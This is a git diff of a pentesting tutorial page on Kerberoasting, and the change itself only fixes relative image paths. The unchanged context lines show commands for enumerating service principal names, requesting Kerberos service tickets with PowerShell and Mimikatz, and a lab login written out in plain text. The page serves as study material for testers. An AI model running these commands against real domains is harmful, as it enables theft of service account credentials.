@@ -35,11 +35,11 @@ Services that support Kerberos authentication require to have a Service Principa
 setspn -T megabank -Q */*
 ```
 
-![](../../../../.gitbook/assets/image%20%28178%29.png)
+![](../../../.gitbook/assets/image%20%28178%29.png)
 
 Services that are bind to a domain user account and not a computer account are more likely configured with a weak password since the user has selected the password. Therefore services which they have their **Canonical-Name** to **Users** should be targeted for Kerberoasting. From the list of SPNs below the service **sql.megabank.local** is associated with a user account.
 
-![](../../../../.gitbook/assets/image%20%28176%29.png)
+![](../../../.gitbook/assets/image%20%28176%29.png)
 
 ### Using Kerberost Toolkit
 
@@ -49,7 +49,7 @@ Services that are bind to a domain user account and not a computer account are m
 . .\GetUserSPNs.ps1
 ```
 
-![](../../../../.gitbook/assets/image%20%28183%29.png)
+![](../../../.gitbook/assets/image%20%28183%29.png)
 
 ### Using cscript.exe
 
@@ -67,7 +67,7 @@ Service Principal Names can be also discovered from non-joined domain systems wi
 ./GetUserSPNs.py -dc-ip 192.168.56.208 megabank.local/client2:"password.321"
 ```
 
-![](../../../../.gitbook/assets/image%20%28182%29.png)
+![](../../../.gitbook/assets/image%20%28182%29.png)
 
 ## Request Service Tickets
 
@@ -86,7 +86,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
  setspn.exe -T megabank.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
 ```
 
-![](../../../../.gitbook/assets/image%20%28180%29.png)
+![](../../../.gitbook/assets/image%20%28180%29.png)
 
 Execution of the **klist** command will list all the available cached tickets.
 
@@ -94,7 +94,7 @@ Execution of the **klist** command will list all the available cached tickets.
 klist
 ```
 
-![](../../../../.gitbook/assets/image%20%28177%29.png)
+![](../../../.gitbook/assets/image%20%28177%29.png)
 
 ### Using Mimikatz
 
@@ -104,7 +104,7 @@ An alternative solution to request service tickets is through Mimikatz by specif
 kerberos::ask /target:PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80
 ```
 
-![](../../../../.gitbook/assets/image%20%28175%29.png)
+![](../../../.gitbook/assets/image%20%28175%29.png)
 
 Similarly to **klist** the list of Kerberos tickets that exist in memory can be retrieved through Mimikatz and save the output to a file:
 
